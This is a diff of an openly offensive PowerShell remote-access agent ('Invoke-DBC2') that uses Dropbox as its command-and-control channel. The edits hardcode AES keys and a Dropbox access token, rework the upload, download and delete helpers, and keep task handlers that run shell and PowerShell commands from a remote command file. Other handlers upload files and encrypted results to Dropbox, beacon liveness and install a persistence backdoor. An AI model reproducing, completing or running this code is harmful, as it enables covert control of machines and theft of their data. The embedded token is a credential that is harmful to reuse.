@@ -1,10 +1,7 @@
 Function Invoke-DBC2{
 
     Function Invoke-Bot{
-
-            $Global:secretIV = "Key@123Key@123fd"
-            $Global:SecretKey = "secret#456!23key"
-
+            
             Function Aes-Decrypt($DecryptData){    
 
                 #Use the AES cipher and represent it as an object.
@@ -14,12 +11,12 @@ Function Invoke-DBC2{
                 $AES.BlockSize = 128
                 $AES.KeySize = 128
                 $enc = [system.Text.Encoding]::UTF8
-                $AES.IV = $enc.GetBytes($Global:secretIV)
+                $AES.IV = $enc.GetBytes('Key@123Key@123fd')
     
                 # $AES.Key = [byte[]] @( 1..32 )
    
                 $enc = [system.Text.Encoding]::UTF8
-                $key = $enc.GetBytes($Global:SecretKey) 
+                $key = $enc.GetBytes('secret#456!23key') 
                 $AES.Key = $key
                 $Decryptor = $AES.CreateDecryptor()
 
@@ -99,23 +96,23 @@ Function Invoke-DBC2{
 
             class dropbox{   
                     # Static Properties
-                    static [String] $ApiKey = " " #Insert DropBox AccessToken Here
-                    static [String] $TargetfilePath
-                    static [String] $root = "dropbox"
-
-                    # [dropbox]::dropboxPutfile("/ExfilStuff/Harold-Reloaded.ps1"".\Untitled1.ps1")
+                    static [String] $ApiKey = "qkwLVnGMbKAAAAAAAAAADatC6sz__QhZG0aEWZhx0TlWIOIVGXpUP7084vCnnnD2"
+                    static [String] $TargetfilePath 
+                    
+                    # [dropbox]::dropboxPutfile("/ExfilStuff/Harold-Reloaded.ps1",".\Untitled1.ps1")
                     static [string]dropboxPutfile($TargetfilePath,$data){
 
                         $ApiK = [dropbox]::Apikey
-                        $arguments = '{ "path": "' + $TargetfilePath + '", "mode": "add", "autorename": true, "mute": false }'
+                        $wc = New-Object System.Net.WebClient
+                        $enc = [system.Text.Encoding]::UTF8
 
+                        $arguments = '{ "path": "' + $TargetfilePath + '", "mode": "add", "autorename": true, "mute": false }'
                         #Give it our Api-Key to interact with the Dropbox Api qkwLVnGMbKAAAAAAAAAADatC6sz__QhZG0aEWZhx0TlWIOIVGXpUP7084vCnnnD2
                         $authorization = "Bearer $ApiK" 
-                        $headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
-                        $headers.Add("Authorization", $authorization)
-                        $headers.Add("Dropbox-API-Arg", $arguments)
-                        $headers.Add("Content-Type", 'application/octet-stream')
-                        $Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:49.0) Gecko/20100101 Firefox/49.0");
+                        $wc.headers.Add("Authorization", $authorization)
+                        $wc.headers.Add("Dropbox-API-Arg", $arguments)
+                        $wc.headers.Add("Content-Type", 'application/octet-stream')
+                        $wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:49.0) Gecko/20100101 Firefox/49.0");
       
                         #DROPBOX HASHTABLE
                         $dropboxAPI = @{
@@ -128,70 +125,62 @@ Function Invoke-DBC2{
                              "getMetaData"="https://api.dropboxapi.com/2/files/get_metadata" 
                         }
 
-                        $res = Invoke-RestMethod -Uri $dropboxAPI.uploadFile -Method Post -InFile $data -Headers $headers
+                        $responseArray = $wc.UploadData("https://content.dropboxapi.com/2/files/upload",$enc.GetBytes($data)) | ConvertFrom-Json  
         
-                        if($res.Content){
-                            return ConvertFrom-SecureString $res.Content
-                        }
-
-                        return $res.rev         
+                        return $responseArray.rev        
                     }
 
-                    # [dropbox]::getRevNumber("/ExfilStuff/Harold-Reloaded2.ps1","") 
-                    static [string]getRevNumber($TargetfilePath,$body){    
+                    # [dropbox]::getRevNumber("/ExfilStuff/Harold-Reloaded2.ps1")          
+                    static [string]getRevNumber($TargetfilePath){    
                         
                         $ApiK = [dropbox]::Apikey
-                        $arguments = '{ "path:"' + $TargetfilePath + '","include_media_info": false, "include_deleted": false,"include_has_explicit_shared_members": false }'
-
-                        #Give it our Api-Key to interact with the Dropbox Api qkwLVnGMbKAAAAAAAAAADatC6sz__QhZG0aEWZhx0TlWIOIVGXpUP7084vCnnnD2
+                        $wc = New-Object System.Net.WebClient
+                        $enc = [system.Text.Encoding]::UTF8
+                        $arguments = '{ "path:"' + $TargetfilePath + '","include_media_info": false, "include_deleted": false,"include_has_explicit_shared_members": false }'               
                         $authorization = "Bearer $ApiK" 
-                        $headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
-                        $headers.Add("Authorization", $authorization)
-                        $headers.Add("Dropbox-API-Arg", $arguments)
-                        $headers.Add("Content-type","application/json")
-                        $Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:49.0) Gecko/20100101 Firefox/49.0");
-        
-                        $res = Invoke-RestMethod -Uri https://api.dropboxapi.com/1/metadata?root=dropbox`&`path=$TargetfilePath -Method Post -Headers $headers -Body (ConvertTo-Json $Body)
+                        $wc.headers.Add("Authorization", $authorization)
+                        $wc.headers.Remove("Dropbox-API-Arg")
+                        $wc.headers.Add("Content-type","application/json")
+                        $wc.headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:49.0) Gecko/20100101 Firefox/49.0");
+                        
+                        [byte[]]$data = [system.Text.Encoding]::ASCII.GetBytes($arguments)
+                        $responseArray = [system.Text.Encoding]::ASCII.Getstring($wc.UploadData("https://api.dropboxapi.com/1/metadata?root=dropbox`&`path=$TargetfilePath", $data))  | ConvertFrom-Json
 
-                        $res.rev
-
-                        return $res.rev
+                        return $responseArray.rev
                     }
 
-                    # [dropbox]::deleteFile("/ExfilStuff/Harold-Reloaded2.ps1","")
-                    static [string]deleteFile($TargetfilePath,$body){    
+                    # [dropbox]::deleteFile("/ExfilStuff/Harold-Reloaded2.ps1")
+                    static [string]deleteFile($TargetfilePath){    
+                        
                         $ApiK = [dropbox]::Apikey
-                        $arguments = '{ "path:"' + $TargetfilePath + '" }'
+                        $wc = New-Object System.Net.WebClient
+                        $enc = [system.Text.Encoding]::UTF8
 
-                        #Give it our Api-Key to interact with the Dropbox Api qkwLVnGMbKAAAAAAAAAADatC6sz__QhZG0aEWZhx0TlWIOIVGXpUP7084vCnnnD2
+                        $arguments = '{ "path:"' + $TargetfilePath + '","include_media_info": false, "include_deleted": false,"include_has_explicit_shared_members": false }'         
                         $authorization = "Bearer $ApiK" 
-                        $headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
-                        $headers.Add("Authorization", $authorization)
-                        $headers.Add("Dropbox-API-Arg", $arguments)
-                        $headers.Add("Content-type","application/json")
-                        $Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:49.0) Gecko/20100101 Firefox/49.0");
-        
-                        $res = Invoke-RestMethod -Uri https://api.dropboxapi.com/1/fileops/delete?root=dropbox`&`path=$TargetfilePath -Method Post -Headers $headers -Body (ConvertTo-Json $Body)
+                        $wc.headers.Add("Authorization", $authorization)
+                        $wc.headers.Remove("Dropbox-API-Arg")
+                        $wc.headers.Add("Content-type","application/json")
+                        $wc.headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:49.0) Gecko/20100101 Firefox/49.0");
+                        
+                        [byte[]]$data = [system.Text.Encoding]::ASCII.GetBytes($arguments)
+                        $responseArray = [system.Text.Encoding]::ASCII.Getstring($wc.UploadData("https://api.dropboxapi.com/1/fileops/delete?root=dropbox`&`path=$TargetfilePath", $data))  | ConvertFrom-Json
 
-                        if($res.Content){
-                            return ConvertFrom-SecureString $res.Content
-                        }
-
-                        return $res.rev
+                        return $responseArray.rev
                     }
 
                     # [dropbox]::downloadFile("/ExfilStuff/Harold-Reloaded.ps1","Harold-Reloaded.ps1")
                     static [string]downloadFile($TargetFilePath,$localfile){
 
                         $ApiK = [dropbox]::Apikey
+                        $wc = New-Object System.Net.WebClient
+                        $enc = [system.Text.Encoding]::UTF8
                         $arguments  = '{ "path":"' + $TargetFilePath + '"}'
-                        $authorization = "Bearer $ApiK"
-                        $headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
-                        $headers.Add("Authorization", $authorization)
-                        $headers.Add("Dropbox-API-Arg", $arguments)
- 
-                         try{
-                            Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/download -Method Post -ContentType '' -OutFile $localfile -Headers $headers -ErrorAction:Stop
+                        $authorization = "Bearer $ApiK"                   
+                        $wc.headers.Add("Authorization", $authorization)
+                        $wc.headers.Add("Dropbox-API-Arg", $arguments)
+                        try{
+                            $wc.DownloadFile("https://content.dropboxapi.com/2/files/download", $localFile)
                             return $true 
                         }catch{ 
                             return $false 
@@ -338,7 +327,6 @@ Function Invoke-DBC2{
             # Get a unique ID for the machine this agent is running on
             $c2_agentID = [C2_agent]::createAgentID()
 
-            $result = $null
             # Break flag used to exit the agent
             $breakFlag = $false
 
@@ -347,9 +335,8 @@ Function Invoke-DBC2{
             $C2StatusFile = "/" + $c2_agentID + ".status"
             $C2CmdFile = "/" + $c2_agentID + ".cmd"
 
-            New-Item ".\Untitled.ps1"
-            $C2CmdFileLastRevNumber = [dropbox]::dropboxPutfile($C2CmdFile,".\Untitled.ps1")
-            $C2StatusFileLastRevNumber = [dropbox]::dropboxPutfile($C2StatusFile,".\Untitled.ps1")
+            $C2CmdFileLastRevNumber = [dropbox]::dropboxPutfile($C2CmdFile, [system.Text.Encoding]::ASCII.GetBytes(" "))
+            $C2StatusFileLastRevNumber = [dropbox]::dropboxPutfile($C2StatusFile, [system.Text.Encoding]::ASCII.GetBytes(" "))
 
             
             ## reading the cmd file
@@ -376,7 +363,7 @@ Function Invoke-DBC2{
                 Write-Output "Setting The random Period: $C2_AgentSleeptime"
 
                 $nano = [dropbox]::readFile($C2CmdFile)
-                $nano
+                
                 # Wait for the polling period to time out
                 Write-Output "Waiting for Polling out Period!!"
                 Start-Sleep $C2_AgentSleeptime
@@ -388,10 +375,10 @@ Function Invoke-DBC2{
                 Write-Output "Calculating Next Sleep time: $C2_AgentSleeptime"
 
                 # At each cycle, 'touch' the status file to show the agent is alive = beaconing
-                $C2StatusFileLastRevNumber = [dropbox]::deleteFile($C2StatusFile,"")
+                $C2StatusFileLastRevNumber = [dropbox]::deleteFile($C2StatusFile)
                 Start-Sleep 3
-                $C2StatusFileLastRevNumber = [dropbox]::dropboxPutfile($C2StatusFile,".\Untitled.ps1")
-                Start-Sleep 12
+                $C2StatusFileLastRevNumber = [dropbox]::dropboxPutfile($C2StatusFile,[system.Text.Encoding]::ASCII.GetBytes(" "))
+                Start-Sleep 10
 
                 ## read the cmd file
                 $enc = [system.Text.Encoding]::UTF8
@@ -401,9 +388,9 @@ Function Invoke-DBC2{
                 if ( $NewCommand -eq $oldCommand ){
 
                     Write-Host "There Are No New instructions Found :)"
-                    Start-Sleep 3
-                    [dropbox]::deleteFile($C2cmdFile,"")                       
-                    Invoke-DropBox
+                    Start-Sleep 2
+                    [dropbox]::deleteFile($C2cmdFile)                       
+                    Invoke-DBC2
                                        
                 }
                 else {
@@ -442,11 +429,9 @@ Function Invoke-DBC2{
                                 Write-Host "$Tab $Tab ERROR - COULD NOT EXECUTE: $exeName"                                             
                                 $launchResult = Aes-Encrypt("[launchProcess][ERROR] External command did not executed properly")                  
                              }
-                             $launchResult >  "C:\ps\launcher.txt"
-                             $launcherFile = "C:\ps\launcher.txt"
-                             # Push the command result to the C2 server                   
-                             [dropbox]::dropboxPutfile($taskResultFile,$launcherFile)
-                             rm "C:\ps\launcher.txt"
+                             # Push the command result to the C2 server
+                             Write-Host "$Tab $Tab Push the command result to the C2 server"                  
+                             [dropbox]::dropboxPutfile($taskResultFile,$launchResult)  
 
                         } 
 
@@ -462,17 +447,15 @@ Function Invoke-DBC2{
                              Write-Host "$Tab [runCLI] Executing: + $result"
                              #Execute the command
                              $results = [c2_agent]::RunCommand($result) | Out-String
-                             $result1 = Aes-Encrypt($results)
-                             $result1 > "C:\ps\test.txt"
+                             $runCLIresults = Aes-Encrypt($results)
+                             
                              if ($result -eq $null){
-                                Write-Host "$Tab [runCLI][ERROR] External command did not executed properly"
+                                Write-Host "$Tab $Tab [runCLI][ERROR] External command did not executed properly"
                              }
-                             $data4 = "C:\ps\test.txt"
+                                                      
                              # Push the command result to the C2 server
-                    
-                             [dropbox]::dropboxPutfile($taskResultFile,$data4)
-                             rm "C:\ps\test.txt"
-
+                              Write-Output "$Tab $Tab Pushing Cmd Result to C2 server"
+                             [dropbox]::dropboxPutfile($taskResultFile,$runCLIresults)
                          }
 
                          "shell"{
@@ -491,18 +474,14 @@ Function Invoke-DBC2{
                              $shellOp = [c2_agent]::runShell($result)
                              $shellOutput =  Aes-Encrypt($shellOp)
                                         
-                             Write-Output "$Tab $Tab Writing Shell Output" + $shellOutput 
+                             Write-Output "$Tab $Tab Writing Shell Output" + $shellO 
 
                              Write-Output "$Tab $Tab Creating C2 dd files"
                              $C2ddFile = "/" + $c2_agentID + ".dd"
-                             $shellOutput >> "C:\ps\$C2ddFile"
-                             $ddfile = "C:\ps\$C2ddFile"
 
                              Write-Output "$Tab $Tab Writing output File to the C2 DeadDrop"
-                             [dropbox]::dropboxPutfile($C2ddFile,"C:\ps\$C2ddFile")
+                             [dropbox]::dropboxPutfile($C2ddFile,$shellOutput)
 
-                             Write-Output "$Tab $Tab Deleting Old DD File"
-                             rm "C:\ps\$C2ddFile"
                 
                          } 
                  
@@ -539,16 +518,11 @@ Function Invoke-DBC2{
                             }
 
                             # Remote file must be deleted
-                            [dropbox]::deleteFile($remoteFile,"")
-                    
-                            $fileresult > "C:\ps\test3.txt"
-                            $dataness = "C:\ps\test3.txt"
-
-
+                            [dropbox]::deleteFile($remoteFile)
+                            Write-Output "$Tab $Tab Pushing Result File to C2 Server!"
                             # Push the command result to the C2 server
-                            [dropbox]::dropboxPutfile($taskResultFile,$dataness)
-                    
-                            rm $dataness
+                            [dropbox]::dropboxPutfile($taskResultFile,$fileresult)
+                                            
                          } 
                  
                          "sendFile"{
@@ -568,24 +542,18 @@ Function Invoke-DBC2{
                                  [dropbox]::dropboxPutfile($remoteFile,$localFile)
                                  Write-Output "$Tab [sendFile] File uploaded"
                                  $res = $remoteFile
-                                 $result =  Aes-Encrypt($res)  
+                                 $fileresult =  Aes-Encrypt($res)  
                                  
                                    
                             }else{
 
                                  $res = "ERROR - FILE NOT FOUND: " + $localFile    
                                  Write-Output "$Tab $Tab [sendFile][ERROR] Command did not executed properly. Localfile not found " + $localFile
-                                 $result = Aes-Encrypt($res)    
+                                 $fileresult = Aes-Encrypt($res)    
                     
                             }
-                            $result >>  "C:\ps\test4.txt"
-                            $dataness = "C:\ps\test4.txt"
-
                             # Push the command result to the C2 server
-                            [dropbox]::dropboxPutfile($taskResultFile,$dataness)
-
-                            rm $dataness
-                                   
+                            [dropbox]::dropboxPutfile($taskResultFile,$fileresult)               
                          }
             
                          "persist"{
@@ -624,7 +592,8 @@ Function Invoke-DBC2{
                                 }else{
                              
 		                             Write-Output "$Tab $Tab Failed To Install Backdoor"
-                                     Break 
+                                    Break 
+
 	                            }
                             }
 
@@ -639,27 +608,24 @@ Function Invoke-DBC2{
 
                              Write-Host "$Tab [runPS] Executing: + $result"
                              #Execute the command
-                             $PSres = Invoke-Expression $result
-                             $PSresult = Aes-Encrypt($PSres)
-                             $PSresult > "C:\ps\test.txt"
+                             $PSresult = Aes-Encrypt(Invoke-Expression $result)
+                            
                              if ($result -eq $null){
                                 Write-Host "$Tab $Tab [runCLI][ERROR] External command did not executed properly"
                              }
 
-                             $PSFile = "C:\ps\test.txt"
                              # Push the command result to the C2 server
-                             Write-Host "$Tab $Tab Push The Resulting Command to DropBox"
-                             [dropbox]::dropboxPutfile($taskResultFile,$PSFile)
-                             rm "C:\ps\test.txt"
-
-                         }             
+                             Write-Host "$Tab $Tab Push The Resulting Module Result to DropBox"
+                             [dropbox]::dropboxPutfile($taskResultFile,$PSresult)
+                            
+                         }                             
                     }                        
                 }   
             }
             catch
             {         
                 Write-Host "$Tab Error has occurred. Restarting"
-                Invoke-DropBox     
+                Invoke-DBC2     
             }
             finally{
             
@@ -667,7 +633,7 @@ Function Invoke-DBC2{
                 Write-Output "Making the latest command the last command for comparing."
                 [string] $Global:oldCommand = $NewCommand
                 Start-Sleep 2
-                [dropbox]::deleteFile($C2cmdFile,"") 
+                [dropbox]::deleteFile($C2cmdFile) 
                       
             }
 
